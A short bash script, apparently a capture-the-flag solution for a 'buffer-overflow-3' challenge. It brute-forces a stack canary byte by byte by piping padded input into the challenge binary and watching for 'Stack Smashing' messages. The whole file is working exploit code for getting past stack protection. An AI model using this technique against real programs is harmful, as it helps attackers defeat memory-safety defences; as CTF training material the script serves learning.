#!/bin/bash
chr() {
  printf \\$(printf '%03o' $1)
}


canary=""
#for i in {A..z}
while test ${#canary} -lt 5
do
#for i in 0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z ! _ \x00 \x0a  \x20  
for i in `seq 20 260`
do
char=$(chr $i)
echo "trying : BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB$canary$char : $i"
output=$(echo -ne "999\n"+"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB$canary$char"|/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce/vuln)
if ! echo $output|grep -q "Stack Smashing"
then
echo "found char : $char"
canary=$canary$char
break
fi
done

done
echo $canary

